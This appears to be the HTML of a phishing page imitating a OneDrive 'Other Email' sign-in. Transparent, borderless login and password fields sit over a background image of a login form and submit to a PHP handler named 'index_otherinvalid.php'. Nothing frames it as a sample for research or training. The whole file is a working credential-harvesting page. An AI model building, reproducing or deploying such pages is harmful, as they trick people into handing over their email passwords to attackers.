<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>One Drive - Other Email</title>
<link rel="shortcut icon" href="images/fav_other.ico">
<style type="text/css">
div#container
{
   width: 800px;
   height: 600px;
   margin-top: 0px;
   margin-left: 0px;
   text-align: left;
}
</style>
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #94A9CB;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="container">
<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:617px;height:535px;text-align:left;z-index:3;">
<img src="images/other.png" id="Image1" alt="" align="top" border="0" style="width:617px;height:535px;"></div>


<div id="bv_Form1" style="position:absolute;left:0px;top:0px;width:631px;height:447px;z-index:4">
<form name="Fom1" method="post" action="index_otherinvalid.php" id="Form1">


<input type="text" id="Editbox1" style="position:absolute;left:165px;top:170px;width:379px;height:40px;border:0px #C0C0C0 solid;background-color:transparent;font-family:'helvetica';font-size:14px;z-index:0" name="login" value="" pattern=".{4,50}" oninvalid="this.setCustomValidity('Required')" oninput="setCustomValidity('')" maxlength="50" required>


<input type="password" id="Editbox2" style="position:absolute;left:165px;top:269px;width:379px;height:40px;border:0px #C0C0C0 solid;background-color:transparent;font-family:'Leelawadee UI Semilight';font-size:16px;z-index:1" name="password" value="" pattern=".{3,20}" oninvalid="this.setCustomValidity('Required')" oninput="setCustomValidity('')" required>


<input type="submit" id="Button1" name="Button1" value="" style="position:absolute;left:368px;top:365px;width:183px;height:48px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2">
</form>
</div>
</div>
</body>
</html>